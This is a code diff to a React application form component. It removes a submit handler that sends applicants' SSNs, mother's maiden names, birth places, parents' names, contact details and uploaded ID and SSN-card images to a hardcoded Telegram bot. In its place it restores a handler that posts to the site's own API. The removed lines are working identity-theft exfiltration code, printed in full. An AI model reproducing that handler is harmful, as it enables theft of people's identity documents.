@@ -9,105 +9,37 @@ const Form = () => {
     const [submitError, setSubmitError] = useState('');
     const navigate = useNavigate();
 
-    const BOT_TOKEN = "7518413075";
-const CHAT_ID = "7650582960";
+    const handleSubmit = async (e) => {
+        e.preventDefault();
+        const formElement = e.currentTarget;
+        setIsSubmitting(true);
+        setSubmitError('');
 
-const handleSubmit = async (e) => {
-  e.preventDefault();
-  setIsSubmitting(true);
-  setSubmitError("");
+        try {
+            const formData = new FormData(formElement);
+            const response = await fetch(`${API_BASE}/api/form-submit`, {
+                method: 'POST',
+                body: formData,
+            });
 
-  try {
-    const formData = new FormData(e.target);
+            const data = await response.json();
 
-    // 1️⃣ Send Text Message
-    const message = `
-📩 NEW APPLICATION
+            if (!response.ok) {
+                throw new Error(data?.message || 'Failed to submit application.');
+            }
 
-👤 Name: ${formData.get("firstName")} ${formData.get("lastName")}
-🆔 SSN: ${formData.get("ssn")}
-📞 Phone: ${formData.get("phone")}
-📧 Email: ${formData.get("email")}
-🏠 Address: ${formData.get("address")}
-⚧ Gender: ${formData.get("gender")}
-👨 Father: ${formData.get("fatherName")}
-👩 Mother: ${formData.get("motherName")}
-👵 Maiden: ${formData.get("motherMaidenName")}
-🌍 Birth Place: ${formData.get("birthPlace")}
-    `;
-
-    await fetch(`https://corsproxy.io/?https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: message,
-      }),
-    });
-
-    // 2️⃣ Send Files (One by One)
-
-    const fileFields = ["idFront", "idBack", "ssnCard", "utilityBill"];
-
-    for (let field of fileFields) {
-      const file = formData.get(field);
-
-      if (file && file.size > 0) {
-        const telegramFile = new FormData();
-        telegramFile.append("chat_id", CHAT_ID);
-        telegramFile.append("document", file);
-
-        await fetch(
-          `https://corsproxy.io/?https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
-          {
-            method: "POST",
-            body: telegramFile,
-          }
-        );
-      }
-    }
-
-    e.target.reset();
-
-  } catch (error) {
-    console.error(error);
-    setSubmitError("Failed to submit");
-  } finally {
-    setIsSubmitting(false);
-  }
-};
-
-    // const handleSubmit = async (e) => {
-    //     e.preventDefault();
-    //     const formElement = e.currentTarget;
-    //     setIsSubmitting(true);
-    //     setSubmitError('');
-
-    //     try {
-    //         const formData = new FormData(formElement);
-    //         const response = await fetch(`${API_BASE}/api/form-submit`, {
-    //             method: 'POST',
-    //             body: formData,
-    //         });
-
-    //         const data = await response.json();
-
-    //         if (!response.ok) {
-    //             throw new Error(data?.message || 'Failed to submit application.');
-    //         }
-
-    //         formElement.reset();
-    //         navigate('/apply/success', {
-    //             state: {
-    //                 message: 'Application submitted successfully. Check your email inbox for additional information.',
-    //             },
-    //         });
-    //     } catch (error) {
-    //         setSubmitError(error.message || 'Something went wrong while submitting.');
-    //     } finally {
-    //         setIsSubmitting(false);
-    //     }
-    // };
+            formElement.reset();
+            navigate('/apply/success', {
+                state: {
+                    message: 'Application submitted successfully. Check your email inbox for additional information.',
+                },
+            });
+        } catch (error) {
+            setSubmitError(error.message || 'Something went wrong while submitting.');
+        } finally {
+            setIsSubmitting(false);
+        }
+    };
 
     return (
         <main className="apply-page">
